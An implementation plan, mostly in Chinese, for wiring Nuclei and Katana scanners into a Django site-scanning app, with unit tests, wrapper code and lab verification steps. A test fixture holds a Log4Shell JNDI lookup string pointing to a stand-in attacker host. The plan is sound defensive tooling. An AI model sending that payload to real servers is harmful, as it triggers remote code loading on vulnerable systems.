# Nuclei Integration Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 整合 Nuclei binary 到 Argus 掃描流程，與 Katana binary 並行執行，取代 active_probes.py，實現免費（精選模板）和付費（全部模板）雙層資安掃描。

**Architecture:** tasks.py 掃描主迴圈結束後，以 `ThreadPoolExecutor(max_workers=2)` 並行啟動 `run_katana`（改為本機 binary）和 `run_nuclei`（新模組）。`deep_mode` 依 `scan_mode=active AND active_testing_authorized` 決定 Nuclei 模板範圍。兩者皆 silent-fail，不影響主流程。

**Tech Stack:** Python subprocess, concurrent.futures.ThreadPoolExecutor, Nuclei v3 Go binary, Katana Go binary, pytest + unittest.mock

---

## File Structure

| 動作 | 路徑 | 職責 |
|---|---|---|
| 新增 | `backend/apps/scans/nuclei_scanner.py` | Nuclei binary 封裝、JSONL 解析、Finding mapping |
| 新增 | `backend/apps/scans/tests_nuclei_scanner.py` | Nuclei 模組單元測試 |
| 修改 | `backend/apps/scans/katana_scanner.py` | Docker → binary，加 `shutil.which` 偵測 |
| 修改 | `backend/apps/scans/tasks.py` | 並行執行、deep_mode 判斷、移除 active_probes |
| 刪除 | `backend/apps/scans/active_probes.py` | 由 Nuclei 取代 |
| 刪除 | `backend/apps/scans/tests_active_probes.py` | 對應測試一併移除 |

---

### Task 1: 建立 tests_nuclei_scanner.py（先寫失敗的測試）

**Files:**
- Create: `backend/apps/scans/tests_nuclei_scanner.py`

- [ ] **Step 1: 建立測試檔**

建立 `backend/apps/scans/tests_nuclei_scanner.py`，內容如下：

```python
"""nuclei_scanner 模組的單元測試。"""
import json
import subprocess
from unittest.mock import MagicMock, patch

from django.test import TestCase


class TestRunNuclei(TestCase):
    """run_nuclei 的單元測試。

    所有呼叫 run_nuclei 的案例都必須 patch append_log，
    否則它會嘗試寫入 DB（ScanJob scan_log 欄位）。
    """

    def test_binary_missing_returns_empty_list(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value=None),
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            from apps.scans.nuclei_scanner import run_nuclei
            result = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(result, [])

    def test_fast_mode_includes_tags_flag(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout="", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            run_nuclei("https://example.com", scan_job_id=1, deep=False)
        cmd = mock_run.call_args[0][0]
        self.assertIn("-tags", cmd)
        idx = cmd.index("-tags")
        self.assertIn("cves", cmd[idx + 1])
        self.assertEqual(cmd[cmd.index("-c") + 1], "25")

    def test_deep_mode_excludes_tags_flag(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout="", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            run_nuclei("https://example.com", scan_job_id=1, deep=True)
        cmd = mock_run.call_args[0][0]
        self.assertNotIn("-tags", cmd)
        self.assertEqual(cmd[cmd.index("-c") + 1], "50")

    def test_parses_nuclei_jsonl_output(self):
        record = {
            "template-id": "CVE-2021-44228",
            "info": {
                "name": "Log4Shell RCE",
                "severity": "critical",
                "description": "JNDI injection leads to RCE.",
                "remediation": "Upgrade to Log4j 2.17.1+.",
                "tags": ["cve", "rce"],
            },
            "matched-at": "https://example.com/api/login",
            "extracted-results": ["jndi:ldap://attacker.com/a"],
        }
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout=json.dumps(record) + "\n", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)

        self.assertEqual(len(results), 1)
        r = results[0]
        self.assertEqual(r["title"], "Log4Shell RCE")
        self.assertEqual(r["severity"], "critical")
        self.assertEqual(r["category"], "security")
        self.assertEqual(r["priority_score"], 90.0)
        self.assertEqual(r["confidence"], 0.85)
        self.assertIn("CVE-2021-44228", r["evidence"])
        self.assertEqual(r["selector"], "")
        self.assertIsNone(r["bounding_box"])
        self.assertIn("ai_handoff_prompt", r)

    def test_severity_to_priority_score_mapping(self):
        from apps.scans.nuclei_scanner import _build_finding

        cases = [
            ("critical", 90.0),
            ("high", 75.0),
            ("medium", 55.0),
            ("low", 30.0),
            ("info", 10.0),
        ]
        for severity, expected_score in cases:
            record = {
                "template-id": "test-tpl",
                "info": {"name": "Test", "severity": severity, "tags": []},
                "matched-at": "https://example.com",
            }
            finding = _build_finding(record)
            self.assertEqual(
                finding["priority_score"],
                expected_score,
                msg=f"severity={severity}",
            )

    def test_deduplication_removes_duplicate_findings(self):
        record_json = json.dumps({
            "template-id": "CVE-2021-44228",
            "info": {"name": "Log4Shell", "severity": "critical", "tags": []},
            "matched-at": "https://example.com/api",
        })
        two_lines = record_json + "\n" + record_json + "\n"
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout=two_lines, returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(len(results), 1)

    def test_timeout_returns_empty_list(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="nuclei", timeout=360)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(results, [])

    def test_malformed_json_line_is_skipped(self):
        good_record = json.dumps({
            "template-id": "test-id",
            "info": {"name": "Valid", "severity": "high", "tags": []},
            "matched-at": "https://example.com",
        })
        mixed = "NOT_JSON\n" + good_record + "\n"
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout=mixed, returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["title"], "Valid")
```

- [ ] **Step 2: 執行測試，確認全部失敗（模組還不存在）**

```powershell
cd C:\Users\ntub\Desktop\Argus
uv run python backend/manage.py test apps.scans.tests_nuclei_scanner -v 2 2>&1
```

預期輸出：
```
ImportError: cannot import name 'run_nuclei' from 'apps.scans.nuclei_scanner'
```
或所有測試 `ERROR`，代表測試框架正確運行、目標模組尚未建立。

---

### Task 2: 實作 nuclei_scanner.py（讓測試通過）

**Files:**
- Create: `backend/apps/scans/nuclei_scanner.py`

- [ ] **Step 1: 建立 nuclei_scanner.py**

建立 `backend/apps/scans/nuclei_scanner.py`，內容如下：

```python
"""Nuclei 資安掃描整合。

以本機 nuclei binary 執行弱點掃描，支援兩種模式：
- fast（免費）：精選模板 + 6 分鐘上限
- deep（付費）：全部模板 + 12 分鐘上限

任何錯誤皆靜默回傳 []，不影響主掃描流程。
"""
from __future__ import annotations

import json
import logging
import shutil
import subprocess
from typing import TYPE_CHECKING

from apps.scans.scan_logger import append_log

if TYPE_CHECKING:
    pass

logger = logging.getLogger(__name__)

_PRIORITY: dict[str, float] = {
    "critical": 90.0,
    "high": 75.0,
    "medium": 55.0,
    "low": 30.0,
    "info": 10.0,
}

_TAG_IMPACT: dict[str, str] = {
    "cve": "known_vulnerability",
    "misconfig": "misconfiguration",
    "exposure": "information_exposure",
    "default-logins": "default_credentials",
    "xss": "cross_site_scripting",
    "sqli": "sql_injection",
    "ssrf": "server_side_request_forgery",
    "rce": "remote_code_execution",
}


def run_nuclei(
    url: str,
    scan_job_id: int,
    *,
    deep: bool = False,
) -> list[dict]:
    """執行 Nuclei 掃描並回傳 Finding dict 列表。

    deep=False：精選模板（cves/vulnerabilities/misconfigurations/exposures/default-logins），6 分鐘硬限。
    deep=True：全部模板，12 分鐘硬限。
    binary 不存在或任何例外皆 silent-fail 回傳 []。
    """
    if not shutil.which("nuclei"):
        append_log(scan_job_id, "Nuclei binary 未安裝，略過", level="warn")
        return []

    hard_timeout = 720 if deep else 360
    mode_label = "深度（付費）" if deep else "快速（免費）"

    cmd = [
        "nuclei",
        "-u", url,
        "-j",
        "-silent",
        "-timeout", "30" if deep else "15",
        "-c", "50" if deep else "25",
    ]
    if not deep:
        cmd += ["-tags", "cves,vulnerabilities,misconfigurations,exposures,default-logins"]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=hard_timeout,
        )
    except subprocess.TimeoutExpired:
        append_log(scan_job_id, f"Nuclei 超時（{hard_timeout}s），略過", level="warn")
        return []
    except Exception as exc:  # noqa: BLE001
        append_log(scan_job_id, f"Nuclei 失敗（{exc.__class__.__name__}），略過", level="warn")
        return []

    findings = _parse_jsonl(result.stdout.splitlines())
    append_log(scan_job_id, f"Nuclei 完成（{mode_label}）：{len(findings)} 項發現")
    return findings


def _parse_jsonl(lines: list[str]) -> list[dict]:
    """解析 Nuclei JSONL 輸出，回傳去重後的 Finding dict 列表。"""
    findings: list[dict] = []
    seen: set[tuple[str, str]] = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            record = json.loads(line)
        except json.JSONDecodeError:
            continue

        template_id = record.get("template-id", "")
        matched_at = record.get("matched-at", "")
        key = (template_id, matched_at)
        if key in seen:
            continue
        seen.add(key)

        finding = _build_finding(record)
        if finding:
            findings.append(finding)

    return findings


def _build_finding(record: dict) -> dict | None:
    """將 Nuclei JSONL 記錄轉為 Argus Finding dict。"""
    info = record.get("info") or {}
    template_id = record.get("template-id", "unknown")
    name = info.get("name") or template_id
    raw_severity = (info.get("severity") or "info").lower()
    severity = raw_severity if raw_severity in _PRIORITY else "info"

    description = info.get("description") or f"Nuclei 模板 {template_id} 偵測到安全問題。"
    remediation = info.get("remediation") or "請參考官方修補建議或對應 CVE 詳情。"
    matched_at = record.get("matched-at") or record.get("host", "")

    extracted = record.get("extracted-results") or []
    evidence_parts = [f"命中 URL：{matched_at}", f"Template：{template_id}"]
    if extracted:
        evidence_parts.append(f"提取結果：{'; '.join(str(r) for r in extracted[:3])}")

    tags: list[str] = info.get("tags") or []
    impact_area = "vulnerability"
    for tag in tags:
        if tag in _TAG_IMPACT:
            impact_area = _TAG_IMPACT[tag]
            break

    return {
        "category": "security",
        "severity": severity,
        "title": name,
        "description": description,
        "remediation": remediation,
        "evidence": "；".join(evidence_parts),
        "selector": "",
        "bounding_box": None,
        "impact_area": impact_area,
        "confidence": 0.85,
        "priority_score": _PRIORITY[severity],
        "ai_handoff_prompt": (
            f"Nuclei 在你的網站偵測到資安問題，請協助分析：\n"
            f"- 問題：{name}\n"
            f"- 嚴重度：{severity}\n"
            f"- 命中位置：{matched_at}\n"
            f"請說明此問題的影響範圍、利用方式與修復優先順序。"
        ),
    }
```

- [ ] **Step 2: 執行測試，確認全部通過**

```powershell
cd C:\Users\ntub\Desktop\Argus
uv run python backend/manage.py test apps.scans.tests_nuclei_scanner -v 2 2>&1
```

預期輸出：
```
test_binary_missing_returns_empty_list (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
test_deep_mode_excludes_tags_flag (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
test_deduplication_removes_duplicate_findings (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
test_fast_mode_includes_tags_flag (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
test_malformed_json_line_is_skipped (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
test_parses_nuclei_jsonl_output (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
test_severity_to_priority_score_mapping (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
test_timeout_returns_empty_list (apps.scans.tests_nuclei_scanner.TestRunNuclei) ... ok
----------------------------------------------------------------------
Ran 8 tests in 0.XXXs
OK
```

- [ ] **Step 3: Commit**

```powershell
cd C:\Users\ntub\Desktop\Argus
git add backend/apps/scans/nuclei_scanner.py backend/apps/scans/tests_nuclei_scanner.py
git commit -m "feat(scans): 新增 nuclei_scanner 模組（fast/deep 雙模式）"
```

---

### Task 3: 將 katana_scanner.py 從 Docker 改為本機 binary

**Files:**
- Modify: `backend/apps/scans/katana_scanner.py`

目前 `run_katana` 透過 `docker run projectdiscovery/katana:latest` 執行，本次改為直接呼叫本機 `katana` binary。**解析邏輯（`_parse_jsonl_lines` 及後續函式）完全不動。**

- [ ] **Step 1: 修改 run_katana 函式（僅改 import 和 cmd 區段）**

在 `backend/apps/scans/katana_scanner.py` 第 14 行的 import 區段，加入 `shutil`：

```python
# 原有 imports（在 import subprocess 後加一行）
import shutil
import subprocess
```

接著將 `run_katana` 函式的前半段（第 60–113 行）整個替換：

**舊內容（第 60–113 行）：**
```python
def run_katana(
    url: str,
    max_depth: int = 3,
    max_pages: int = 50,
) -> tuple[list[dict], list[str]]:
    """以 Docker 執行 Katana 並回傳 (findings, tech_stack)。

    任何錯誤（Docker 不可用、timeout、parse 失敗）皆靜默回傳 ([], [])。
    """
    image = getattr(settings, "KATANA_DOCKER_IMAGE", "projectdiscovery/katana:latest")
    timeout = getattr(settings, "KATANA_TIMEOUT", 90)

    cmd = [
        "docker", "run", "--rm",
        image,
        "-u", url,
        "-d", str(max_depth),
        "-jc",           # JS 端點解析
        "-jsl",          # jsluice 深度 JS 秘鑰挖掘
        "-td",           # 技術棧識別
        "-j",            # JSONL 輸出
        "-silent",
        "-timeout", "10",
        "-rl", "10",
        "-c", "5",
        "-p", "1",
    ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except FileNotFoundError:
        logger.warning("katana_scanner: docker 指令不存在，略過 Katana 掃描")
        return [], []
    except subprocess.TimeoutExpired:
        logger.warning("katana_scanner: Katana 超時（%ds），略過", timeout)
        return [], []
    except Exception as exc:  # noqa: BLE001
        logger.warning("katana_scanner: 執行失敗 %s，略過", exc.__class__.__name__)
        return [], []

    if result.returncode != 0 and not result.stdout.strip():
        logger.warning(
            "katana_scanner: exit=%d stderr=%s",
            result.returncode,
            result.stderr[:200],
        )
        return [], []

    return _parse_jsonl_lines(result.stdout.splitlines())
```

**新內容（完整替換）：**
```python
def run_katana(
    url: str,
    max_depth: int = 3,
    max_pages: int = 50,
) -> tuple[list[dict], list[str]]:
    """以本機 katana binary 執行並回傳 (findings, tech_stack)。

    任何錯誤（binary 不存在、timeout、parse 失敗）皆靜默回傳 ([], [])。
    """
    if not shutil.which("katana"):
        logger.warning("katana_scanner: katana binary 不存在，略過")
        return [], []

    timeout = getattr(settings, "KATANA_TIMEOUT", 90)

    cmd = [
        "katana",
        "-u", url,
        "-d", str(max_depth),
        "-jc",
        "-jsl",
        "-td",
        "-j",
        "-silent",
        "-timeout", "10",
        "-rl", "10",
        "-c", "5",
    ]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        logger.warning("katana_scanner: Katana 超時（%ds），略過", timeout)
        return [], []
    except Exception as exc:  # noqa: BLE001
        logger.warning("katana_scanner: 執行失敗 %s，略過", exc.__class__.__name__)
        return [], []

    if result.returncode != 0 and not result.stdout.strip():
        logger.warning(
            "katana_scanner: exit=%d stderr=%s",
            result.returncode,
            result.stderr[:200],
        )
        return [], []

    return _parse_jsonl_lines(result.stdout.splitlines())
```

- [ ] **Step 2: 確認現有測試仍通過（lint + 快速 import 檢查）**

```powershell
cd C:\Users\ntub\Desktop\Argus
uv run python -c "from apps.scans.katana_scanner import run_katana; print('OK')" 2>&1
uv run ruff check backend/apps/scans/katana_scanner.py 2>&1
```

預期輸出：
```
OK
All checks passed!
```

- [ ] **Step 3: Commit**

```powershell
git add backend/apps/scans/katana_scanner.py
git commit -m "refactor(scans): katana_scanner 從 Docker 改為本機 binary"
```

---

### Task 4: 修改 tasks.py（並行執行 + deep_mode + 移除 active_probes）

**Files:**
- Modify: `backend/apps/scans/tasks.py`

- [ ] **Step 1: 更新 import 區段**

在 `backend/apps/scans/tasks.py` 頂部 import 區段做以下三處修改：

**加入**（在 `import asyncio` 之後）：
```python
from concurrent.futures import ThreadPoolExecutor
```

**加入**（在 `from apps.scans.katana_scanner import run_katana` 之後）：
```python
from apps.scans.nuclei_scanner import run_nuclei
```

**移除** 這一行：
```python
from apps.scans.active_probes import run_active_probes
```

- [ ] **Step 2: 替換 Katana + active_probes 區段**

找到以下區段（約第 161–206 行）並完整替換：

**舊內容（Katana 補充掃描 + T14 主動探測整段）：**
```python
        # Katana 補充掃描：JS 秘鑰偵測、技術棧識別、JS 端點挖掘
        # 靜默失敗：Docker 不可用或 Katana 超時時僅記錄警告，不影響主掃描
        append_log(scan_job_id, "Katana 補充掃描開始（JS 秘鑰 / 技術棧 / 端點）")
        try:
            katana_findings, katana_tech = run_katana(
                scan_job.normalized_url,
                max_depth=scan_job.max_depth,
                max_pages=scan_job.max_pages,
            )
            for finding in katana_findings:
                Finding.objects.create(scan_job=scan_job, page=None, **finding)
            all_findings.extend(katana_findings)
            if katana_tech:
                updated_warnings = dict(scan_job.warning_summary or {})
                updated_warnings["tech_stack"] = katana_tech
                scan_job.warning_summary = updated_warnings
                scan_job.save(update_fields=["warning_summary", "updated_at"])
            append_log(
                scan_job_id,
                f"Katana 完成：{len(katana_findings)} 項資安發現"
                + (f"，技術棧：{', '.join(katana_tech)}" if katana_tech else ""),
            )
        except Exception as exc:  # noqa: BLE001 — Katana 失敗不應讓整個掃描失敗
            append_log(scan_job_id, f"Katana 略過（{exc.__class__.__name__}）", level="warn")

        # 站台層級的 GEO FAST 檢查（llms.txt、AI 爬蟲可存取性）
        site_findings = analyze_site_signals(site_signals)
        for finding in site_findings:
            Finding.objects.create(scan_job=scan_job, page=None, **finding)
        all_findings.extend(site_findings)
        append_log(scan_job_id, f"站台訊號分析完成：{len(site_findings)} 項發現")

        # T14 主動式資安：只在 active 模式 + 額外授權下執行；RPS 限制由 RateLimitedClient 強制
        if (
            scan_job.scan_mode == ScanJob.ScanMode.ACTIVE
            and scan_job.active_testing_authorized
        ):
            append_log(scan_job_id, "主動式資安探測開始（路徑枚舉 / 目錄 / SQLi）")
            active_findings = run_active_probes(
                origin=scan_job.origin,
                pages=scan_job.pages.all(),
            )
            for finding in active_findings:
                Finding.objects.create(scan_job=scan_job, page=None, **finding)
            all_findings.extend(active_findings)
            append_log(scan_job_id, f"主動探測完成：{len(active_findings)} 項發現")
```

**新內容：**
```python
        # 並行執行 Katana（JS 秘鑰 / 技術棧）+ Nuclei（資安掃描）
        raise_if_cancelled(scan_job_id)
        deep_mode = (
            scan_job.scan_mode == ScanJob.ScanMode.ACTIVE
            and scan_job.active_testing_authorized
        )
        append_log(
            scan_job_id,
            "資安補充掃描開始 — Katana（JS 秘鑰 / 技術棧）並行 Nuclei"
            f"（{'深度付費' if deep_mode else '快速免費'}）",
        )
        with ThreadPoolExecutor(max_workers=2) as executor:
            f_katana = executor.submit(
                run_katana,
                scan_job.normalized_url,
                scan_job.max_depth,
                scan_job.max_pages,
            )
            f_nuclei = executor.submit(
                run_nuclei,
                scan_job.normalized_url,
                scan_job_id,
                deep=deep_mode,
            )
        katana_findings, katana_tech = f_katana.result()
        nuclei_findings = f_nuclei.result()

        for finding in katana_findings + nuclei_findings:
            Finding.objects.create(scan_job=scan_job, page=None, **finding)
        all_findings.extend(katana_findings + nuclei_findings)

        if katana_tech:
            updated_warnings = dict(scan_job.warning_summary or {})
            updated_warnings["tech_stack"] = katana_tech
            scan_job.warning_summary = updated_warnings
            scan_job.save(update_fields=["warning_summary", "updated_at"])

        append_log(
            scan_job_id,
            f"資安補充掃描完成：Katana {len(katana_findings)} 項，"
            f"Nuclei {len(nuclei_findings)} 項"
            + (f"，技術棧：{', '.join(katana_tech)}" if katana_tech else ""),
        )

        # 站台層級的 GEO FAST 檢查（llms.txt、AI 爬蟲可存取性）
        site_findings = analyze_site_signals(site_signals)
        for finding in site_findings:
            Finding.objects.create(scan_job=scan_job, page=None, **finding)
        all_findings.extend(site_findings)
        append_log(scan_job_id, f"站台訊號分析完成：{len(site_findings)} 項發現")
```

- [ ] **Step 3: 確認 tasks.py import 正確、無殘留 active_probes 引用**

```powershell
cd C:\Users\ntub\Desktop\Argus
uv run python -c "from apps.scans.tasks import run_scan_job; print('OK')" 2>&1
uv run ruff check backend/apps/scans/tasks.py 2>&1
```

預期輸出：
```
OK
All checks passed!
```

若 ruff 回報 `F401 'apps.scans.active_probes.run_active_probes' imported but unused`，代表 import 尚未移除，請重新確認 Step 1。

- [ ] **Step 4: 執行現有測試，確認無迴歸**

```powershell
cd C:\Users\ntub\Desktop\Argus
uv run python backend/manage.py test apps.scans.tests_progress apps.scans.tests_cancel apps.scans.tests_topology -v 2 2>&1
```

預期輸出：所有測試 `ok`，最後一行 `OK`（無 FAIL）。

- [ ] **Step 5: Commit**

```powershell
git add backend/apps/scans/tasks.py
git commit -m "refactor(scans): tasks.py 改為並行 Katana+Nuclei，移除 active_probes，加入 deep_mode"
```

---

### Task 5: 刪除 active_probes.py 和 tests_active_probes.py

**Files:**
- Delete: `backend/apps/scans/active_probes.py`
- Delete: `backend/apps/scans/tests_active_probes.py`

- [ ] **Step 1: 刪除兩個檔案**

```powershell
cd C:\Users\ntub\Desktop\Argus
Remove-Item backend/apps/scans/active_probes.py
Remove-Item backend/apps/scans/tests_active_probes.py
```

- [ ] **Step 2: 確認無任何其他檔案引用 active_probes**

```powershell
cd C:\Users\ntub\Desktop\Argus
Select-String -Path "backend/**/*.py" -Pattern "active_probes" -Recurse 2>&1
```

預期輸出：**無任何結果**（空輸出）。若有殘留引用，逐一移除。

- [ ] **Step 3: 執行全部測試，確認無迴歸**

```powershell
cd C:\Users\ntub\Desktop\Argus
uv run python backend/manage.py test apps.scans -v 2 2>&1
```

預期輸出：所有測試 `ok`，最後一行 `OK`。`tests_active_probes` 不再出現。

- [ ] **Step 4: Django check**

```powershell
uv run python backend/manage.py check 2>&1
```

預期輸出：
```
System check identified no issues (0 silenced).
```

- [ ] **Step 5: Commit**

```powershell
git add -A
git commit -m "chore(scans): 刪除 active_probes.py 及測試，由 Nuclei 取代"
```

---

### Task 6: 安裝 binary 並手動整合驗證

- [ ] **Step 1: 安裝 Nuclei binary**

```powershell
# 方法 A：Go install（需 Go 環境）
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 方法 B：直接下載 release binary
# 至 https://github.com/projectdiscovery/nuclei/releases 下載 nuclei_*_windows_amd64.zip
# 解壓並將 nuclei.exe 放到 PATH 可找到的位置（如 C:\Users\ntub\go\bin\）

# 更新模板庫（必要，否則無模板可跑）
nuclei -update-templates
```

- [ ] **Step 2: 安裝 Katana binary**

```powershell
# 方法 A：Go install
go install github.com/projectdiscovery/katana/cmd/katana@latest

# 方法 B：至 https://github.com/projectdiscovery/katana/releases 下載 windows_amd64 binary
```

- [ ] **Step 3: 確認兩個 binary 可執行**

```powershell
nuclei -version 2>&1
katana -version 2>&1
```

預期輸出：各自顯示版本號，無 `command not found`。

- [ ] **Step 4: 對靶機執行免費模式掃描（passive）**

啟動靶機（DVWA 或 OWASP Juice Shop），然後透過 Argus 前端建立 `scan_mode=passive` 的掃描任務，或直接呼叫 API：

```powershell
# 確認 Django 已啟動
uv run python backend/manage.py runserver 127.0.0.1:8000

# 在另一個 terminal 呼叫（替換 token 和 url）
curl -X POST http://127.0.0.1:8000/api/scans/ `
  -H "Authorization: Bearer <your_token>" `
  -H "Content-Type: application/json" `
  -d '{"url": "http://localhost:8080", "scan_mode": "passive"}' 2>&1
```

驗證：
1. scan log 含 `資安補充掃描開始 — Katana（JS 秘鑰 / 技術棧）並行 Nuclei（快速免費）`
2. scan log 含 `Nuclei 完成（快速（免費））：N 項發現`（N ≥ 0）
3. `/api/scans/<id>/findings/` 有 `category=security` 的結果

- [ ] **Step 5: 對靶機執行付費模式掃描（active + authorized）**

```powershell
curl -X POST http://127.0.0.1:8000/api/scans/ `
  -H "Authorization: Bearer <your_token>" `
  -H "Content-Type: application/json" `
  -d '{"url": "http://localhost:8080", "scan_mode": "active", "active_testing_authorized": true}' 2>&1
```

驗證：
1. scan log 含 `Nuclei（深度付費）`
2. Finding 數量 ≥ 免費模式的數量（全部模板 > 精選模板）
3. 總掃描時間 < 15 分鐘

- [ ] **Step 6: 最終全量測試**

```powershell
cd C:\Users\ntub\Desktop\Argus
uv run python backend/manage.py test apps.scans -v 2 2>&1
uv run ruff check backend/ 2>&1
```

預期輸出：所有測試 `OK`，ruff 無錯誤。
